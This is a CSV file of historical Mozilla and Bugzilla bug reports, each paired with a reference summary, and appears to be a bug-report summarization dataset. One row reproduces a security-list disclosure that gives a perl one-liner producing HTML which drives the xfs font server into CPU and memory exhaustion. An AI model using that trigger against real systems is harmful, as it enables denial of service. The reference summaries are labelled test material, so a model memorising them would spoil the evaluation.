bug.id,bug_report,ground_truth_summary
11872,"User-Agent:       Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.3b) Gecko/20030117 Build Identifier: http://ftp.mozilla.org/pub/mozilla/nightly/latest/  If I enter the url of myy localhost ie. 127.0.0.1 or the ip address of my current machine ie. 10.0.0.1, and a webserver is defenitely running there, it won't connect. Also when teh dialog box comes up to ask whether to save the password, the dialog box is incomplete, only teh yes and no buttons show and not the ""never for this site"" nor the message text.  Reproducible: Always  Steps to Reproduce: 1.type in http://127.0.0.1 or http://yourhostname 2.go to a site where it will ask to save a username and password. 3.  Actual Results:   1 => the page won't load 2 => dialog box is incomplete  Expected Results:   1 => Page should load 2 => dialog box should be complete.",The browser won't load/connect to a page/host that is local
11917,"---------- Forwarded message ---------- Date: Mon, 17 Dec 2001 12:42:25 +0200 (EET) From: Mikko Rapeli <mikko.rapeli@iki.fi> To: security@xfree86.org, mozilla-security@mozilla.org Subject: xfs remote DoS with Mozilla  Hi!  I crashed my RedHat Linux 7.1 box once when viewing one of my handwritten web  pages, and after some debugging is seems that bad html on Mozilla starts xfs font server  spinning out of control. xfs eats all CPU time and memory after opening the page with Mozilla, which seems to be asking for larger and larger fonts.  Perhaps someone from xfree or mozilla lists can debug the details.  There is a bug in Mozilla when viewing this kind of page, but xfs still should not go crazy. I did not have time to install newer versions of Xfree, but  at least http://www.xfree.org/security/ does not show a fix for this.  Linux setup:  $ uname -a Linux lnx 2.4.2-2 #1 Sun Apr 8 20:41:30 EDT 2001 i686 unknown  $ X -version  XFree86 Version 4.0.3 / X Window System (protocol Version 11, revision 0, vendor release 6400) Release Date: 16 March 2001         If the server is older than 6-12 months, or if your card is         newer than the above date, look for a newer version before         reporting problems.  (See http://www.XFree86.Org/FAQ) Operating System: Linux 2.2.17-8smp i686 [ELF] Module Loader present  $ mozilla -version Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.6) Gecko/20011120, build  2001112012  $ mozilla -version Mozilla/5.0 (X11; N; Linux 2.4.2-2 i686), build 2001031614  The 'not-that-bad' html page:  $ perl -e 'print ""<HTML>"" x 1; print ""<BODY>"" x 1;print ""<CENTER><P><H3>A"" x  100; print ""</BODY>"" x 1;print ""</HTML>"" x 1'  top log: <snip>    4:07pm  up 23:08,  6 users,  load average: 0.02, 0.06, 0.02 1 processes: 1 sleeping, 0 running, 0 zombie, 0 stopped CPU states:  2.7% user,  0.8% system,  0.0% nice, 44.8% idle Mem:   125640K av,  122956K used,    2684K free,       0K shrd,    1604K buff Swap:  208804K av,   99844K used,  108960K free                   64972K cached   PID USER     PRI  NI  SIZE  RSS SHARE STAT %CPU %MEM   TIME COMMAND  1208 xfs        9   0 73100  27M 20948 S     0.0 22.4  17:18 xfs  1208 xfs        9   0 73100  27M 20948 S     0.0 22.4  17:18 xfs  1208 xfs       17   0 73100  30M 23816 D    45.3 24.5  17:19 xfs  1208 xfs       17   0 73100  27M 24080 D    30.0 22.1  17:20 xfs  1208 xfs       15   0 73056  31M 29092 D    15.1 25.7  17:20 xfs  1208 xfs       15   0 73056  34M 32284 D    12.1 28.3  17:20 xfs  1208 xfs       17   0 73056  39M 37056 D     6.6 32.1  17:20 xfs  1208 xfs       17   0 73056  42M 39852 D     2.4 34.3  17:20 xfs    4:08pm  up 23:09,  6 users,  load average: 0.54, 0.16, 0.05 1 processes: 1 sleeping, 0 running, 0 zombie, 0 stopped CPU states:  4.3% user,  7.1% system,  0.0% nice, 88.5% idle Mem:   125640K av,  122436K used,    3204K free,       0K shrd,     404K buff Swap:  208804K av,  114312K used,   94492K free                   63136K cached    PID USER     PRI  NI  SIZE  RSS SHARE STAT %CPU %MEM   TIME COMMAND  1208 xfs       17   0 73056  45M 43728 D     5.7 37.4  17:21 xfs  <had to killall mozilla-bin to avoid out-of-mem, snip>  It seems that neither xfs nor Mozilla have any real security holes, since Mozilla only asks for larger and larger fonts. However, this is way too easy to reproduce, and when the xfs dies the whole X session becomes unstable...  Regards, -Mikko",xfs remote DoS with Mozilla
11921,"User-Agent:       Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021007 Build Identifier: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021007  Immediate crash loading http://geocities.com/moz_blubber - the moment it starts loading.  This is GeoCities, so who knows what crap they're loading onto the page ...  Reproducible: Always  Steps to Reproduce: 1. Go to http://geocities.com/moz_blubber 2. Crash!  Actual Results:   Crash  Expected Results:   Load page. Works fine in IE 5.5.  Crashes in 2002100704 and 2002100308.  Talkbacks from 2002100308: TB12198118X TB19198178G TB12198219Q  Talkback from 2002100704: TB12198718M",Immediate crash loading http://geocities.com/moz_blubber [@ nsView::ConvertFromParentCoords ][@ nsView::GetClippedRect]
12042,"From Bugzilla Helper: User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR  1.0.3705) BuildID:    RedHat Linux 7.3  mozilla crashes and closes without any worning when i tell it to visit these  pages: http://www.my-siemens.com/MySiemens/CDA/Index/0,2730,HQ_en_0_product%253AMW% 252FHD%252FHD%252FS45I%252Fdanda,FF.html  and   www.coolmobiles.com (in the account session, when trying to send sms)    Reproducible: Always Steps to Reproduce: 1.visit one of the above pages 2.it closes 3.",it justs closes when it visits these pages:
12099,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.3) Gecko/20041125 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.3) Gecko/20041125  This might be bug#180309, but it looks somewhat different. I have a Gentoo mozilla compiled from source.  I have no mention of any LineHeight method. The Testpage attachment#106556 from bug#180309 works fine for me.  The binary mozilla package of Ggentoo works, but fonts get not antialiased.  The stack trace looks like this: #0  0xffffe410 in ?? () #1  0xbfffc1fc in ?? () #2  0x4a448800 in ?? () from /lib/libc.so.6 #3  0xbfffc058 in ?? () #4  0x4a3c46e6 in nanosleep () from /lib/libc.so.6 #5  0x4a3c4504 in sleep () from /lib/libc.so.6 #6  0x0806b24f in ah_crap_handler(int) () #7  0xb6362315 in nsProfileLock::FatalSignalHandler(int) ()    from /usr/lib/mozilla/components/libprofile.so #8  <signal handler called> #9  0xb71813c9 in nsTextFrame::TextStyle::TextStyle(nsIPresContext*, nsIRenderingContext&, nsStyleContext*) () from /usr/lib/mozilla/components/libgklayout.so #10 0xb71756ea in nsTextFrame::GetLastInFlow() const ()    from /usr/lib/mozilla/components/libgklayout.so #11 0xb70fdfaf in nsContainerFrame::PaintChild(nsIPresContext*, nsIRenderingContext&, nsRect const&, nsIFrame*, nsFramePaintLayer, unsigned) ()    from /usr/lib/mozilla/components/libgklayout.so #12 0xb70e12c7 in nsBlockFrame::PaintChild(nsIPresContext*, nsIRenderingContext&, nsRect const&, nsIFrame*, nsFramePaintLayer, unsigned) ()    from /usr/lib/mozilla/components/libgklayout.so #13 0xb70f1ae7 in nsBlockFrame::GetDepth() const ()    from /usr/lib/mozilla/components/libgklayout.so   ldd /usr/lib/mozilla/components/libgklayout.so         linux-gate.so.1 =>  (0xffffe000)         libgkgfx.so => /usr/lib/mozilla/libgkgfx.so (0xb7748000)         libxpcom.so => /usr/lib/mozilla/libxpcom.so (0xb761b000)         libplds4.so => /usr/lib/mozilla/libplds4.so (0xb7617000)         libplc4.so => /usr/lib/mozilla/libplc4.so (0xb7612000)         libnspr4.so => /usr/lib/mozilla/libnspr4.so (0xb75d9000)         libpthread.so.0 => /lib/libpthread.so.0 (0xb75c8000)         libdl.so.2 => /lib/libdl.so.2 (0xb75c5000)         libmozjs.so => /usr/lib/mozilla/libmozjs.so (0xb7532000)         libgtk-x11-2.0.so.0 => /usr/lib/libgtk-x11-2.0.so.0 (0xb727d000)         libgdk-x11-2.0.so.0 => /usr/lib/libgdk-x11-2.0.so.0 (0xb720f000)         libatk-1.0.so.0 => /usr/lib/libatk-1.0.so.0 (0xb71f5000)         libgdk_pixbuf-2.0.so.0 => /usr/lib/libgdk_pixbuf-2.0.so.0 (0xb71e0000)         libpangoxft-1.0.so.0 => /usr/lib/libpangoxft-1.0.so.0 (0xb71db000)         libpangox-1.0.so.0 => /usr/lib/libpangox-1.0.so.0 (0xb71d0000)         libpango-1.0.so.0 => /usr/lib/libpango-1.0.so.0 (0xb719a000)         libgobject-2.0.so.0 => /usr/lib/libgobject-2.0.so.0 (0xb7165000)         libgmodule-2.0.so.0 => /usr/lib/libgmodule-2.0.so.0 (0xb7161000)         libglib-2.0.so.0 => /usr/lib/libglib-2.0.so.0 (0xb70e8000)         libm.so.6 => /lib/libm.so.6 (0xb70c7000)         libstdc++.so.5 => /usr/lib/gcc-lib/i686-pc-linux-gnu/3.3.4/libstdc++.so.5 (0xb6ffb000)         libgcc_s.so.1 => /usr/lib/gcc-lib/i686-pc-linux-gnu/3.3.4/libgcc_s.so.1 (0xb6ff1000)         libc.so.6 => /lib/libc.so.6 (0xb6ee7000)         /lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x80000000)         libX11.so.6 => /usr/X11R6/lib/libX11.so.6 (0xb6e21000)         libXrandr.so.2 => /usr/X11R6/lib/libXrandr.so.2 (0xb6e1d000)         libXi.so.6 => /usr/X11R6/lib/libXi.so.6 (0xb6e15000)         libXext.so.6 => /usr/X11R6/lib/libXext.so.6 (0xb6e06000)         libXft.so.2 => /usr/X11R6/lib/libXft.so.2 (0xb6df4000)         libfreetype.so.6 => /usr/lib/libfreetype.so.6 (0xb6d85000)         libXrender.so.1 => /usr/X11R6/lib/libXrender.so.1 (0xb6d7d000)         libfontconfig.so.1 => /usr/lib/libfontconfig.so.1 (0xb6d57000)         libXcursor.so.1 => /usr/X11R6/lib/libXcursor.so.1 (0xb6d4e000)         libpangoft2-1.0.so.0 => /usr/lib/libpangoft2-1.0.so.0 (0xb6d26000)         libexpat.so.0 => /usr/lib/libexpat.so.0 (0xb6d07000)         libz.so.1 => /lib/libz.so.1 (0xb6cf7000)   Reproducible: Always Steps to Reproduce: 1. Visit http://www.sparc.org/ 2. Wait till page is loaded 3. If mozilla is still alive, click ""Workstation""  Actual Results:   Mozilla crashes, if compiled without debug with Segfault, otherwise with something like this: UNKNOWN [/usr/lib/mozilla/components/libwidget_gtk2.so +0x00032B4E] nsWindow::OnExposeEvent(_GtkWidget*, _GdkEventExpose*)+0x00000113 [/usr/lib/mozilla/components/libwidget_gtk2.so +0x00024B15] UNKNOWN [/usr/lib/mozilla/components/libwidget_gtk2.so +0x00029164] Sleeping for 5 minutes. Type 'gdb /usr/lib/mozilla/mozilla-bin 8176' to attach your debugger to this thread.   Expected Results:   Page displayed.  I changed recently changed the following things: - transition from XFree86 to X.org - usage of native posix threads I recompiled mozilla after those changes  I have those relevant packages installed: - freetype-1.3.1 - freetype-2.1.9 (same thing with freetype-2.1.5) - xorg-x11-6.8.0",Mozilla crashes [@ nsTextFrame::TextStyle::TextStyle ]
12255,"Overview Description:    There's no Form and Image Manager submenus in Tasks > Privacy and Security  for subwindows like History, Manage Bookmarks, and Search Bookmarks/History  Steps to Reproduce:   1) Open the History, Manage Bookmarks or Search Bookmarks/History window.   2) Tasks > Privacy and Security  Actual Results:   Form Manager and Image Manager are missing (I don't think  Image Manager should be there in comm builds unless you have the pref enabled) Expected Results: Tasks > Privacy and Security should be the same throughout  the app, so those two submenus should be there.  Reproducibility: 100%  Build Date & Platform Bug Found:   just-pulled win98se  Additional Information:   There's presumably a missing overlay for these windows.",Form and Image Manager submenus missing in Tasks menu of subwindows
12375,"Hixie pointed this out to me  If all flags are disabled for a bug, then we still show the headers, even if the flag is not set (if it is set, then we should show the header)  The stuff in bug_form.pl needs to search for non-disabled flags, or disabled flags which are set when setting flag types.  I'm not sure if attachment flags have the same issue, but they probably do",flag table's header shown even if all flags are disabled
12412,User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2b) Gecko/20021022 Phoenix/0.3 Build Identifier: Moz 1.1  the menu which is pulled up by right-clicking a bookmark does not have it's hotkeys underlined.  Reproducible: Always  Steps to Reproduce: 1. 2. 3.,right-click menu in bookmark manager doesn't have underlined accesskeys (no mnemonics in personal toolbar)
12434,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6b) Gecko/20031212 Firebird/0.7+ (MozJF) Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6b) Gecko/20031212 Firebird/0.7+ (MozJF)  Seems to be a recent regression (2 days ?).  It is simple to see. Grab latest nightly of firebird (11 december for now), go to this url, and download mozilla.exe full installer.  You will get this :  your target/mozilla-win32-1.5-installer.exe/mozilla-win32-1.5-installer.exe  Really annoying.  I saw this bug on a recent homemade build (based on sources up-to-date at midnight mozilla.org/time)  Reproducible: Always  Steps to Reproduce: 1.grab 11 december build 2.go to url 3.download installer.exe  Actual Results:   Directory with same file name.  Expected Results:   no directory.  Happens only with .exe file.  COuld it be related to bugfix for 214260 added on 10th december ?",Downloading creates a directory with the same name as downloaded file
12498,"From Bugzilla Helper: User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:1.0rc1) Gecko/20020417 BuildID:    2002041712  don't know how to describe this, but sometimes the curson just seems to stick to the page and when I move the cursor, the whole page will move with the cursor.  I can usually control click and unfreeze it.  It does not happen often.    I suspect it is my mistake -- hitting wrong combination of keys or by accidentally hitting the right click button (ctr. +click)  Reproducible: Didn't try Steps to Reproduce:",cursor sticks and drags page around
12524,"User-Agent:       Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.3) Gecko/20030312 Build Identifier: Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.3) Gecko/20030312  The Download Manager in Mozilla 1.3 does not close with either Command-W from the keyboard or with the choice of Close from the File menu.  It does close if you click on the red X close button.  Mac OS X 10.2.5, Mozilla 1.3 for Mac OS X.  Reproducible: Always  Steps to Reproduce: 1. Go to Tools, choose Download Manager. 2. Go to File, choose Close (nothing happens) 3. On the keyboard, hold down Command (open apple) and press the w key (nothing happens)  Actual Results:   Download Manager does not close.  Expected Results:   Download Manager should close.",Download Manager does not close with Command-W or File-Close
12534,"User-Agent:       Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Build Identifier: 0.6.1  Clicking URL's opens in already used windows. I'd like the option that exists in IE that makes clicking a URL open a NEW instance of Mozilla, not re-using a browser-window that is already in use.  Reproducible: Always  Steps to Reproduce: 1. Click URL in Eudora, ICQ, Whatever...  Actual Results:   Current pages opened in some Mozilla Browser window get's replaced by this URL.  Expected Results:   Opened a new Browser",Clicking URL's opens in already used windows
12579,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040803 Firefox/0.8 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040803 Firefox/0.8  Including this code <link  href="""" rel=""stylesheet"" type=""text/css"" /> in a page will make Firefox request the page URL again.   Reproducible: Always Steps to Reproduce: 1. Save out this code to a webserver under your control:  <html>   <head>     <title>Bug or feature?</title>     <link rel=""stylesheet"" type=""text/css"" href=""default.css"" title=""Default Style"" />     <link rel=""stylesheet"" type=""text/css"" href="""" title=""Re-requests page"" />   </head>   <body>     <p>Bug or feature?</p>   </body> </html>  2. Navigate to it with Firefox.  Actual Results:   Logfiles (and packet sniffers) show requests for foo.html, default.css, and then foo.html again.   Expected Results:   Browser should either detect that the URL has been loaded in this ""hit"" and parse the downloaded one (as it should if I were to include, in a single file, two CSS links to the same URL). OR it should detect that the link is empty and do nothing.",page gets requested twice on empty href in css link
12667,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.6b) Gecko/20031126 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.6b) Gecko/20031126  The download speed status indicator does not update ! A download speed of 450 KB/sec  may show up as 150 KB/sec and NEVER updates. The progress bar is working in that same window but the ststus line information doesnt work properly.   Reproducible: Always  Steps to Reproduce: 1.Go to any site and click a download 2.select save to disk 3.Rename the file if you want 4.Click save 5.The next window shows the    Saving From: (location of file)    To: (location to save file)    Status: (file size info)(speed at KB/sec)    Time Left:    Time Elapsed:    Progress: (Graphic representation of download) 6. View download speed - Value initially displayed remains constant Actual Results:   Speed display is not updated after initial value is displayed  Expected Results:   Continuously update the display of download speed (KB/sec).  I have downloaded several files at over 450 KB/sec and the initial displayed speed was reported as anywhere from 103 to 180 KB/sec when the download started.  The initially displayed value for KB/sec does not change during a continuous download...  However...  IF...  I pause the download for several seconds and then resume the download, a new speed is displayed, but that new speed display is never updated either.",Download speed does not update
12678,"I noticed this morning this from mozilla.org sanitycheck.cgi:  Checking cached keywords   Bug(s) found with incorrect keyword cache: 46700, 47682, 48303, 50670, 50810, 50875, 51067, 51316, 51574, 51748, 51768, 52134, 52141, 52451, 52457, 52527, 52528, 52530, 52558, 52654, 52887, 52971, 53085, 53087, 53482, 54327, 54328, 55091, 55502, 55667, 56114, 56218, 56379, 56568, 57676, 58951, 58954, 59122, 59480, 59613, 59928, 59964, 61830, 63764, 64139, 64151, 65076, 8388607   At least the first one, probably most of these were due to a keyword rename.  It turns out editkeywords.cgi does not update the version cache of bugs when it renames a keyword.  As far as I can tell, show_bug doesn't use the version cache, so it's not terrible, but I presume queries use it.  I'm still looking at the last, illegal bug number.",Keyword cache not updated on keyword rename/delete (remove the keyword cache)
12704,User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.5b) Gecko/20030827 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.5b) Gecko/20030827  The mouse wheel does not work on the drop down history list.  When that list is open one cannot move the selection bar with the mouse wheel.  Reproducible: Always  Steps to Reproduce: 1. 2. 3.,mouse wheel and drop down history list
12830,Reproducible: Always Steps to Reproduce: 1.1.Help Contents is chosen from the Help menu. 2.A browser window is clicked.  Actual Results: A browser window does not become active.  Expected Results: A browser window does become active.  Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; ja-JP; rv:1.7b) Gecko/20040312 Firefox/0.8.0+,A browser window cannot be made active when a Help window is displayed.
13086,"User-Agent:       Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322) Build Identifier: Bugzilla Version 2.16.4  This page has a ""Send Mail to Bug Owners"" link that doesn't seem to work with  multiple addresses.  The problem seems to be that a comma is used instead of a  semi-colon. FROM: <a  href=""mailto:aaa@widget.com,bbb@widget.com,ccc@widget.com,ddd@widget.com"">Send  Mail to Bug Owners</a>  TO: <a  href=""mailto:aaa@widget.com;bbb@widget.com;ccc@widget.com;ddd@widget.com"">Send  Mail to Bug Owners</a>  I am using Micro$oft Outlook 2000 SP3.  Reproducible: Always Steps to Reproduce: 1. Make a query with multiple people on the list 2. press ""Send Mail to Bug Owners"" Actual Results:   all of the email addresses munged together  Expected Results:   an email addressed to all bug owners on the list","""Mail to bug owners"" link doesn't work properly with Outlook"
13124,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8a5) Gecko/20041020 Firefox/0.9.1+ Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8a5) Gecko/20041020 Firefox/0.9.1+  If I follow a link that contains an anchor which is to be found in a nested table, it is displayed outside the view area.  It happens only if I click this link for the first time. If I go back and click the link again, it stays in the right position, as well as if I enter the target URL directly.   Reproducible: Sometimes Steps to Reproduce: 1. http://karlsruhe.feg.de/ 2. Click ""Samstag, 6. November"" near the flag (it is the link http://karlsruhe.feg.de/myfeg/index.php?html_seite=14#20041106 ).   Actual Results:   The subsequent page appeared in the right position, but only for a short time - then it scrolled down one table row, which makes the anchor position disappear.  Expected Results:   Show the desired table row, described by the anchor, within the view area - and stay there.  The page also contains an auto-scrolling menu, maybe it has to do with that.",wrong scroll position for an anchor within a table
13198,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7      Reproducible: Always  Steps to Reproduce: 1. ""c:\program files\mozilla firefox\firefox.exe"" ""www.google.com""   - this opens a new window for Google. 2. ""c:\program files\mozilla firefox\firefox.exe"" ""http://www.google.com""   - this opens google in my current window. 3. ""c""\program files\mozilla firefox\firefox.exe"" ""google.com""   - This opens google in a new window.   Expected Results:   Firefox should open the URL in the same window as expected. If this should not be the case, firefox should be consistant enough to open the URL in a new window.  Window behaviour for ""www.site.com"" and ""http://site.com"" should be identical.","[firefox.exe ""url.com""] opens new window, [firefox.exe ""http://url.com""] opens in current window"
13220,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8) Gecko/20051107 Firefox/1.5 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8) Gecko/20051107 Firefox/1.5  list-style-image CSS property works perfect with a number of image formats: list-style-image: url(/images/my_image.png); list-style-image: url(/images/my_image.gif); ...  Yet it does not work with svg images.  list-style-image: url(/images/my_image.svg);  Tested with FireFox 1.5 RC2  Reproducible: Always  Steps to Reproduce: 1. Create an image 2. Save as .png and as .svg 3. Create a document with <ul> and some <li> tags 4. Create a CSS stylesheet with an ul.list-style-image property 5. Assign ""url(/images/my_image.png)"" value to the list-style-image property 6. View page 7. Assign ""url(/images/my_image.svg)"" value to the list-style-image property 8. View page  Actual Results:   In step 6. the list-style-image is properly applied In step 8. the list-style-image is NOT applied at all.  Expected Results:   It should have applied the list-style-image property as incicated.  Probably this is just enabling svg image hendling for this property.",No SVG support when using list-style-image CSS property
13278,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686; he; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4  Some (all?) HTML comments that contain the text ""--"" force Firefox to display the comments in the webpage. For instance: ""<p>Hello <!-- fucking --> World</p>"" Produces: ""Hello World""  However,""<p>Hello <!-- Big -- Bad --> World</p>"" Produces: ""Hello <!-- Big -- Bad --> World""   Reproducible: Always  Steps to Reproduce: 1.Create page with HTML comment that includes ""--"" within the comment 2.Display page in Fx  Actual Results:   The text ""Hello <!-- Big -- Bad --> World"" was displayed in the browser.    Expected Results:   The browser should have displayed ""Hello World"".  The bug was confirmed by others, as you can see on this page: http://www.siteexperts.com/forums/viewConverse.asp?d_id=19226","Text ""--"" in HTML comments forces browser to display the comments in webpage."
13363,"User-Agent:       Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1) Gecko/20061024 Iceweasel/2.0 (Debian-2.0+dfsg-1) Build Identifier: Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1) Gecko/20061024 Iceweasel/2.0 (Debian-2.0+dfsg-1)  Consider the following example:  <script type=""text/javascript"" src=""foo.js""/> <script type=""text/javascript"">     alert(""Bar!"") </script>  With that script present in the page, one would expect (I should think) to receive a Javascript alert dialog.  One does not.  The script specified by the self-terminating tag is sourced but the script in the tag following it is not.  However,  <script type=""text/javascript"" src=""foo.js""></script> <script type=""text/javascript"">     alert(""Bar!"") </script>  works as expected.  Reproducible: Always  Steps to Reproduce: See ""Details"" section. Actual Results:   The second script tag's contents were apparently not sourced; no alert dialog appeared.  Expected Results:   I expected that the alert dialog would appear.  I skimmed the HTML 4.01 standard and could not find any rules specifying that certain tags should not be self-terminated.  The standard does state, however, that any number of script tags in a document is legal.  It bears mentioning that Firefox 2.0, IE6, and IE7 all exhibit this behavior, but Konqueror v3.5.5 does not (the self-terminating tag behaves the same as the normal tag).  While this particular problem is not catastrophic by any stretch of the imagination, it did cause me almost an hour of irritating head-scratching.  :)  Thanks for your time.",Script tags cease to function as expected after a self-terminating script tag.
13570,"User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4  I could only escape it by shutting down the browser and restarting it. If I was quick enough to close the tab before it could begin loading when I reopen the crashed session, I could stop it freezing again, but that was very difficult.  Since facebook.com uses some special plugin to upload photos, I think that's what's causing the problem.  Reproducible: Always  Steps to Reproduce: 1. Go to an album you own at facebook.com on a computer that doesn't have the upload plugin 2. Click on 'edit'  Actual Results:   Firefox freezes.  Expected Results:   The 'edit album' page should load.  Again, I suspect this bug is caused by something to do with facebook.com's upload application.","""Edit photo album"" at facebook.com causes firefox to freeze"
13688,We need to move the existing tracking protection content out of the doorhanger that's currently shared with the Mixed Content Blocking feature.,Move existing Tracking Protection functionality from shield doorhanger to Control Center
13724,"Some use cases that have been found via user feedback: * It's hard to determine how groups are created (where does one go? how does one add groups?) * It's hard to understand what other groups people can create.   I think an example or some gray text explaining what to do will be really beneficial in the groups box.   Also, a tooltip somewhere with the following sentence:  ""Add groups to associate yourself to other Mozillians! Don't worry about mispellings, the groups box will pick up a default group if you're close!""",Need a better explanation of what groups is and how it works in the UI
13768,"Using a linux build from today mozilla crashes if you go to any bug in bugzilla and try to create an attachment, the crash happens when you click on the ""Browse"" button, just before the filepicker should pop up. I only have a release build so I can't point at the exact location where the crash occures, but I'll attach a stacktrace that gives you some idea about where the crash occures...  I don't see this problem on WinNT.",Crash when trying to create bugzilla attachment.
13822,The old code used to check for an image frame and reframe if there wasn't one... I guess we need to try to do that here too.  Of course it's not clear how this affects <object>....  Perhaps a better way is to reframe if the CURRENT_REQUEST has an error status.  But what happens if the CURRENT_REQUEST is simply null?  That's covered by http://web.mit.edu/bzbarsky/www/testcases/image-loading/appendNoSrcAndSetSource-standards.html,[FIX]Setting src on broken image broke in standards mode
13835,Using BuildID 2003072404 on WinXPSP1 with BClary's UA sidebar installed 1. Try changing UA string  Expected result 1. Popup window asking for granting permision  Actual result 1. Following message appears in JavaScript Console: Error: uncaught exception: enablePrivilege not granted 2. No popup window  Works fine in BuildID 2003072304 and prior,Error: uncaught exception: enablePrivilege not granted
13845,"[Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8b3) Gecko/20050708 SeaMonkey/1.0a] (nightly) (W98SE)  In ""Add/Remove Programs"", program name was rebranded from ""Mozilla (1.8b2)"", which was fine to ""SeaMonkey (1.0)"", which is out of sync..  This is misleading, and, if it works as ""Mozilla"" was, will prevent installing v1.0a along v1.0b along v1.0(f) :-(","[SM v1.0a++, Windows] In ""Add/Remove Programs"", version is ""1.0"" instead of ""1.0a"""
13953,The copy for the autoplay exceptions dialog needs updated,Update autoplay exceptions copy
